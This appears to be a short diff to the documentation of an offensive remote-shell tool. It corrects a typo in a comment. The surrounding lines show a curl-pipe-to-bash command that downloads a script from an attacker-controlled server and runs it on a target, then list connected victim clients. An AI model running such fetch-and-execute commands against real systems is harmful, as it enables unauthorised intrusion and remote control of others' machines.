@@ -120,7 +120,7 @@ http://192.168.0.11:3232/4bb55de4d50cc724afbf89cf46f17d25
 # curl or wget this binary to a target system then execute it,
 curl http://192.168.0.11:3232/4bb55de4d50cc724afbf89cf46f17d25.sh |  bash
 
-# then we can then list what clients are connected
+# then we can list what clients are connected
 catcher$ ls
                                  Targets
 +------------------------------------------+-----------------------------------+
